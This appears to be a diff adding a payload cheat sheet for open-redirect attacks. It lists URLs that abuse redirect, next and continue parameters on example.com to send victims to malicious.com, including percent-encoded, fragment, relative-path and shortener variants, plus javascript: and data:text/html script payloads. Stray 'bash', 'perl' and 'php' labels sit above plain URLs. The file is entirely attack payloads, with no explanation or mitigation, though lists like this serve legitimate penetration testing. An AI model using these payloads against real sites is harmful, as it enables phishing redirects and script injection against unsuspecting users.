@@ -1,0 +1,55 @@
+Basic Payloads:
+
+bash
+
+https://example.com/redirect?url=http://malicious.com
+https://example.com/login?next=http://malicious.com
+https://example.com/continue?url=http://malicious.com
+https://example.com/redirect?url=data:text/html,<script>window.location='http://malicious.com'</script>
+
+Payloads with Different Encodings:
+
+perl
+
+https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
+https://example.com/redirect?url=%68%74%74%70%3a%2f%2f%6d%61%6c%69%63%69%6f%75%73%2e%63%6f%6d
+
+Payloads with Valid URL Characters:
+
+perl
+
+https://example.com/redirect?url=http%3A%2F%2Fmalicious.com%23example
+https://example.com/redirect?url=http://malicious.com%3Fnext=%2Fredirected
+
+Using JavaScript Redirection:
+
+bash
+
+https://example.com/redirect?url=javascript:window.location='http://malicious.com'
+https://example.com/redirect?url=javascript:alert('Open Redirect Vulnerability')
+
+Using Data URI for Redirection:
+
+php
+
+https://example.com/redirect?url=data:text/html,<script>window.location='http://malicious.com'</script>
+
+Relative Paths for Redirection:
+
+bash
+
+https://example.com/redirect?url=/login?next=http://malicious.com
+https://example.com/redirect?url=../evilpage
+
+Using Fragment Identifier:
+
+bash
+
+https://example.com/redirect?url=http://legit.com/#http://malicious.com
+
+URL Shortener Redirection:
+
+perl
+
+https://bit.ly/2Wpe7Bn?next=http://malicious.com
+https://tinyurl.com/y5clltt3?url=http://malicious.com
